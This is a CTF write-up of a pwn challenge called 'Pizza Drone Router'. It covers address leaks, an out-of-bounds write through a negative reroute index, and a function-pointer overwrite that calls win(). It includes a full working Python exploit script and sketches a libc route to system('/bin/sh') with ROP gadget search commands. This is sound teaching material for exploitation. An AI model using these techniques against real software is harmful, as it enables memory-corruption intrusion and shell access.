
# PicoCTF 2026 — Pizza Drone Router

**Category:** Binary Exploitation  
**Difficulty:** Hardest pwn challenge in PicoCTF 2026  
**Mitigations:** PIE, Stack Canary, NX, Full RELRO

Also this was one of the only challenges which did not have a clear format it was in the form of flag{..}
---

## What the binary is

A pizza delivery simulator. You load a city map, place orders to coordinates on the grid, and dispatch drones to deliver them. The drone animates along the path one hop at a time, printing a beep per step, and calls a finish function at the end that prints "Order delivered."

Sitting quietly inside the binary is a `win()` function that opens `flag.txt` and prints it. Nothing ever calls it normally.

The city map looks like this:

```
################
#..#......#....#
#..#..##..#..#.#
#..#..#...#..#.#
#..#..#...#..#.#
#S.#..#...#..#.#
#..#..#...#..#.#
#..#......#....#
################
```

S is where the drone spawns. A* pathfinds from S to your destination and stores the route.

---

## What the program looks like normally

This is what a completely normal session looks like — load a map, place an order, dispatch it:

```
Pizza Drone Router (type 'help')
router> load city1
ok
router> add_order 1 1
order #0 → (1,1)
router> dispatch 0
dispatching…
* beep *
* beep *
* beep *
* beep *
* beep *
* beep *
* beep *
Order delivered.
router> receipt 0
receipt: hops=8 coupon=0 total=8 hint=0x5578214b6b20
router> replay 0
replay: 8 points; renderer=0x557821492260
(1,8) -> (1,7) -> (1,6) -> (1,5) -> (1,4) -> (1,3) -> (1,2) -> (1,1)
router> reroute 0 5 99
reroute scheduled
router> quit
bye
```

Seven beeps for a seven step path, then "Order delivered." The receipt and replay commands are what gave us our leaks — more on that later.

---

## What it looks like when the exploit runs

This is the full program output during our exploit. From the outside it looks completely normal until the very last delivery:

```
Pizza Drone Router (type 'help')
router> load city1
ok
router> add_order 1 1
order #0 → (1,1)
router> add_order 1 2
order #1 → (1,2)
router> dispatch 0
dispatching…
* beep *
* beep *
* beep *
* beep *
* beep *
* beep *
* beep *
Order delivered.
router> dispatch 1
dispatching…
* beep *
* beep *
* beep *
* beep *
* beep *
* beep *
Order delivered.
router> replay 0
replay: 8 points; renderer=0x557821492260
(1,8) -> (1,7) -> (1,6) -> (1,5) -> (1,4) -> (1,3) -> (1,2) -> (1,1)
router> receipt 0
receipt: hops=8 coupon=0 total=8 hint=0x5578214b6b20
router> receipt 1
receipt: hops=7 coupon=0 total=7 hint=0x5578214b7460
router> add_order 1 1
order #2 → (1,1)
router> receipt 2
receipt: hops=8 coupon=0 total=8 hint=0x5578214b7da0
router> reroute 1 -875 13
reroute scheduled
router> reroute 0 -631 13
reroute scheduled
router> reroute 1 -875 13
reroute scheduled
router> reroute 0 -631 13
reroute scheduled
... (~45 more reroutes silently building G[0]) ...
router> reroute 2 131 21847
reroute scheduled
router> dispatch 2
dispatching…
* beep *
* beep *
* beep *
* beep *
* beep *
* beep *
* beep *

*** 30 minutes or FLAG free! ***
FLAG{...}

router>
```

No crash, no error, no suspicious output. Seven beeps just like every other delivery. The only difference is instead of "Order delivered." the flag printed. The binary had no idea anything unusual happened.

---

## How the renderer works internally

Every order gets a renderer struct allocated on the heap via calloc. It holds the path array and two function pointers at the end:

```
renderer struct (0x440 bytes)
├── +0x000  misc fields
├── +0x008  ptr → path array base (&renderer[0x18])
├── +0x010  ptr → vtable area    (&renderer[0x420])
├── +0x018  path entry 0  { coord(4 bytes), cost(4 bytes) }
├── +0x020  path entry 1
│   ...
├── +0x430  fx_finish_dummy  ← called once when drone finishes
└── +0x438  fx_draw_basic    ← called once per hop (prints beep)
```

During dispatch the binary loops over all path entries calling the hop pointer, then falls out of the loop and calls the finish pointer. We need to replace that finish pointer with `win()`.

---

## The bug

There is a `reroute` command that lets you reweight a node in the renderer's internal min-heap. It takes an order id, a heap index, and a new cost value.

Internally it does this:

```c
entry = renderer->path_array_base + heap_idx * 8;
entry->coord    = order.y * G[0] + order.x;
entry->cost     = new_cost;
heapify_up(heap, heap_idx);
```

There is no bounds check on `heap_idx`. Pass a negative number and it walks backwards in memory, writing outside the renderer struct entirely.

---

## Memory layout

The heap sits just above the BSS segment. BSS is where global variables live, including `G[]` — the map structure. `G[0]` specifically stores the map width, which every reroute reads when computing coord.

```
lower addresses
┌─────────────────────────────┐
│  BSS                        │
│  G[]  ←  G[0] = map width  │  ← our target
│  ORD[] ← order array        │
├─────────────────────────────┤
│  HEAP                       │
│  renderer_A                 │
│  renderer_C                 │
│  renderer_B                 │
└─────────────────────────────┘
higher addresses
```

Because G[0] sits below the heap, the index to reach it from any renderer's path array base comes out negative. Negative indices skip the heapify sift-up entirely since the loop condition `idx > 0` fails immediately — so no crash, clean write every time.

---

## Getting the leaks

The binary hands us two leaks for free through normal game commands.

`replay 0` prints a pointer labelled "renderer" in the output. Despite the name, this is actually the address of `fx_draw_basic` — a code pointer inside the binary. Subtract its known offset and you have the PIE base. From there you can calculate the address of everything in the binary including `win()`.

`receipt 0` prints a pointer labelled "hint". Despite that name, this is actually the renderer struct's heap address. From this you can calculate the negative index that walks back to G[0].

Yes the field names in the output are swapped from what you'd expect. Took a while to figure that out.

```python
fx_draw_basic = int(re.search(r'renderer=(0x[0-9a-f]+)', replay_out).group(1), 16)
renderer_A    = int(re.search(r'hint=(0x[0-9a-f]+)',     receipt_A).group(1),   16)

PIE_base = fx_draw_basic - 0x2260
win      = fx_draw_basic + 0x200
G_abs    = PIE_base + 0x25780
```

---

## Why we need G[0]

The finish pointer at `renderer+0x430` is a 64-bit address. Reroute writes two 32-bit values side by side at whatever location you point it at:

```
[target + 0]  =  coord     =  order.y * G[0] + order.x
[target + 4]  =  new_cost  =  whatever you pass as the third argument
```

The upper 32 bits of `win()` go in as `new_cost` — you just pass it directly. The lower 32 bits have to come out of the coord formula, and you can't escape that formula. The only way to make coord equal `lower32(win)` is to set G[0] to `lower32(win) - 1` first, then use an order at y=1, x=1:

```
coord = 1 * (lower32(win) - 1) + 1 = lower32(win)  ✓
```

---

## Building G[0] — the arithmetic engine

Each reroute pointed at G[0] using the negative index overwrites G[0] with a new value based on what it already was. Using two different orders gives us two operations:

Order A (y=1, x=1) — increments:

```
new G[0] = 1 * G[0] + 1 = G[0] + 1
```

Order C (y=2, x=1) — doubles:

```
new G[0] = 2 * G[0] + 1
```

We work backwards from the target number to 16 (the real map width), recording whether each reverse step was a halving or a decrement, reverse the sequence, then replay it forward. About 50 operations total to reach any 32-bit target.

One important detail — reroute also writes `new_cost` into `G[4]`, the slot right next to G[0] in memory. G[4] stores the map height. If it becomes 0, the bounds check in `add_order` rejects everything. We pass 13 as the cost argument on every build step to keep G[4] intact.

Each renderer sits at a different heap address so each needs its own index to reach G[0]:

```python
idx_for_A = (G_abs - renderer_A - 0x18) // 8   # ≈ -631
idx_for_C = (G_abs - renderer_C - 0x18) // 8   # ≈ -875
```

Using the wrong index for the wrong renderer writes to G_abs + some_offset instead of G[0] itself. Learned that the hard way when the doubles were silently writing into map character data.

---

## One important ordering issue

The pathfinder runs at `add_order` time, not at dispatch time. Once G[0] is corrupted the map width looks insane to A* and it rejects orders. So order B — the one we eventually dispatch to fire `win()` — has to be added while G[0] is still 16, before we touch anything. Dispatch just replays the stored path, so the corruption doesn't affect the drone's actual route.

---

## The overwrite

With G[0] sitting at `lower32(win) - 1`, one reroute on order B at index 131 lands exactly on the finish pointer:

```
renderer_B + 0x18 + (131 * 8) = renderer_B + 0x430  ✓
```

```python
send(f'reroute 2 131 {upper32_win}')
```

What gets written:

```
renderer_B + 0x430  ←  coord    = lower32(win)
renderer_B + 0x434  ←  new_cost = upper32(win)

read together as one 64-bit pointer:
upper32(win) << 32 | lower32(win)  =  win()  ✓
```

The heapify sift-up for index 131 is harmless — all entries were zeroed by calloc so parent.cost is 0, and upper32(win) > 0 means the comparison `new_cost < parent.cost` is always false. No swap, no crash, pointer stays in place.

---

## Pulling the trigger

```
dispatch 2

  * beep *   call [renderer_B + 0x438] → fx_draw_basic
  * beep *   call [renderer_B + 0x438] → fx_draw_basic
  * beep *   call [renderer_B + 0x438] → fx_draw_basic
  * beep *   call [renderer_B + 0x438] → fx_draw_basic
  * beep *   call [renderer_B + 0x438] → fx_draw_basic
  * beep *   call [renderer_B + 0x438] → fx_draw_basic
  * beep *   call [renderer_B + 0x438] → fx_draw_basic

  call [renderer_B + 0x430] → win() → FLAG{...}
```

---

## The exploit script

```python
#!/usr/bin/env python3
import subprocess, re, os

os.chdir(os.path.dirname(os.path.abspath(__file__)))

if not os.path.exists('flag.txt'):
    open('flag.txt', 'w').write('FLAG{test_local_pwn_success}\n')

proc = subprocess.Popen(
    ['./router'],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

def read_until_prompt():
    buf = b''
    while not buf.endswith(b'router> '):
        byte = proc.stdout.read(1)
        if not byte:
            break
        buf += byte
    return buf.decode(errors='replace')

def send(command):
    proc.stdin.write((command + '\n').encode())
    proc.stdin.flush()
    return read_until_prompt()

read_until_prompt()

# place two setup orders and dispatch them to get leaks
send('load city1')
send('add_order 1 1')   # order A — increment tool (y=1)
send('add_order 1 2')   # order C — doubling tool  (y=2)
send('dispatch 0')
send('dispatch 1')

replay_out = send('replay 0')
receipt_A  = send('receipt 0')
receipt_C  = send('receipt 1')

fx_draw_basic = int(re.search(r'renderer=(0x[0-9a-f]+)', replay_out).group(1), 16)
renderer_A    = int(re.search(r'hint=(0x[0-9a-f]+)', receipt_A).group(1), 16)
renderer_C    = int(re.search(r'hint=(0x[0-9a-f]+)', receipt_C).group(1), 16)

PIE_base   = fx_draw_basic - 0x2260
win        = fx_draw_basic + 0x200
lower_win  = win & 0xffffffff
upper_win  = (win >> 32) & 0xffffffff
G_abs      = PIE_base + 0x25780

idx_for_A  = (G_abs - renderer_A - 0x18) // 8
idx_for_C  = (G_abs - renderer_C - 0x18) // 8

# add order B now before we corrupt G[0] so A* can find a valid path
send('add_order 1 1')   # order B — the trigger order
receipt_B  = send('receipt 2')
renderer_B = int(re.search(r'hint=(0x[0-9a-f]+)', receipt_B).group(1), 16)

# build G[0] up to lower_win - 1 using ~50 reroutes
# pass 13 as cost every time to keep G[4] (map height) intact
target = lower_win - 1
T = target
ops_reversed = []
while T != 16:
    if T % 2 == 1 and (T - 1) // 2 >= 16:
        ops_reversed.append('double')
        T = (T - 1) // 2
    else:
        ops_reversed.append('add1')
        T -= 1

ops = list(reversed(ops_reversed))

for op in ops:
    if op == 'double':
        send(f'reroute 1 {idx_for_C} 13')
    else:
        send(f'reroute 0 {idx_for_A} 13')

# stamp win() over the finish pointer in renderer B
# index 131 lands at renderer_B + 0x430 exactly
# coord = 1 * (lower_win - 1) + 1 = lower_win  ✓
# cost  = upper_win                              ✓
send(f'reroute 2 131 {upper_win}')

# dispatch — drone flies, finish callback fires, win() runs
output = send('dispatch 2')
print(output)

proc.stdin.close()
proc.wait()
```

---

## What if there was no win() — getting a shell with libc

If win() didn't exist the goal would be calling `system("/bin/sh")` instead. The OOB write primitive, the G[0] corruption chain, and the function pointer overwrite all carry over unchanged. The extra work is threefold.

First you need a libc leak. Many binaries print or leak a libc pointer somewhere in their output — same approach as getting the PIE leak, just looking for a pointer that belongs to libc's address range instead.

Second you compute system() the same way we computed win():

```python
system     = libc_base + libc.symbols['system']
lower_sys  = system & 0xffffffff
upper_sys  = (system >> 32) & 0xffffffff
```

Third — and this is the hard part — you need `"/bin/sh"` in rdi when system() is called. The finish callback fires with whatever rdi the dispatch loop left behind, which is a small path coordinate. Useless.

The theoretical clean solution using only primitives we already have:

We can write any value anywhere in BSS using the same G[0] trick. The string "/bin/sh" is just two 32-bit writes side by side. We plant it at some unused BSS address:

```
write 0x6e69622f  →  "/bin"
write 0x0068732f  →  "/sh\0"
```

Now "/bin/sh" sits at a known address — call it `binsh_addr = PIE_base + bss_offset`.

The renderer has two function pointers, not one. We overwrite both. The hop pointer at +0x438 gets a gadget that loads `binsh_addr` into rdi and returns. The finish pointer at +0x430 gets system(). On the last hop the gadget fires, rdi is set, execution falls through to the finish call, system() runs with the right argument.

```
last hop:   call [renderer + 0x438]  →  gadget: mov rdi, binsh_addr / ret
finish:     call [renderer + 0x430]  →  system("/bin/sh")
                                     →  shell
```

Finding that exact gadget is the remaining piece — something in libc or the binary that loads a known address into rdi cleanly. ROPgadget or ropper against libc will surface candidates:

```bash
ROPgadget --binary libc.so.6 | grep "mov rdi"
ropper -f libc.so.6 --search "pop rdi"
```

In practice most people reach for one_gadget first since it sidesteps the rdi problem entirely by finding spots inside libc where a shell spawns with no argument setup needed. But the manual approach above is theoretically sound using only primitives this binary already gave us.

---

## Summary

| Step | What happened |
|------|--------------|
| Leak PIE | replay command printed fx_draw_basic address |
| Leak heap | receipt command printed renderer struct address |
| OOB write | negative reroute index walked back into BSS |
| Corrupt G[0] | ~50 reroutes built G[0] up to lower32(win) - 1 |
| Overwrite finish ptr | one reroute stamped win() over renderer_B + 0x430 |
| Flag | dispatch called win() instead of fx_finish_dummy |
